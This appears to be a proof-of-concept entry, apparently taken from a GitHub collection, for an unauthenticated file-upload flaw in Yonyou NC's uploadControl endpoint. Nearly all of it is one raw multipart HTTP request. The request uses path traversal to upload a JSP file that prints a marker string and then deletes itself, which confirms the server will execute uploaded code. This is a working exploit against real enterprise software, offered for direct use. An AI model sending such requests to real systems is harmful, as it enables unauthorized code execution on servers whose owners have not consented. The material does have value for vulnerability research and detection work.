# yonyounc_uploadcontrol_fileupload

from: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-uploadControl%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
2024.4.22 @2 

```
POST /mp/login/../uploadControl/uploadFile HTTP/1.1
Host: 192.168.63.133:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Length: 314

------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

111
------WebKitFormBoundaryoDIsCqVMmF83ptmp
Content-Disposition: form-data; name="submit"

<% out.println("202cTEST4b70".replace("TEST","b962ac59075b964b07152d23"));new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
------WebKitFormBoundaryoDIsCqVMmF83ptmp
```
